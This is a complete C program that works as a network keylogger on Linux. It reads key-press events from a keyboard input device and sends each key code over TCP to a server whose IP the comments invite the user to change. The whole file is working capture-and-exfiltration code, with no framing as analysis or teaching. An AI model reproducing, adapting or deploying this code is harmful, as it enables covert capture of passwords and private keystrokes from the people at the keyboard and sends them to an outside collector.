#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h> //to open
#include <unistd.h> //to read/write/close
#include <linux/input.h> //for input_event struct
#include <sys/socket.h> //sockets
#include <arpa/inet.h>
#include <string.h>

int main(){
	const char *device = "/dev/input/event13";
	struct input_event event;
	char * SERVER_IP = "127.0.0.1"; //change it based on your pc
	int SERVER_PORT = 7575;

	//open keyboard event file
	int keyboard_file  = open(device, O_RDONLY);
	//open event file for keyboarads
	if(keyboard_file  == -1){
		perror("error with keyboard file opening");
		return 1;
	}

	//socket creation
	int sock;
	struct sockaddr_in server_addr;
	char server_message[100];

	sock = socket(AF_INET, SOCK_STREAM,0);
	if(sock<0){
		perror("error creating a socket");
		close(keyboard_file);
		return 1;
	}
	//set server
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(SERVER_PORT);
	server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
	
	if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
	    perror("Error connecting to server");
	    close(keyboard_file);
   	    close(sock);
   	     return 1;
			}
	printf("connected to server");
	
	




	while(1){
		//read keyboard-presses
	ssize_t bytes = read(keyboard_file, &event , sizeof(event));
	if(bytes == (ssize_t) sizeof(event)){
		if(event.type == EV_KEY && event.value == 1) { //pressed key event
			//prepare message
			snprintf(server_message,sizeof(server_message),"%d",event.code);
		       //sned to server
		       if(send(sock,server_message,strlen(server_message),0)<0){
		       		perror("error sending data to server");
		 		break;
		       }
		}
	}
}
	close(keyboard_file);
	close(sock);
	return 0;
}
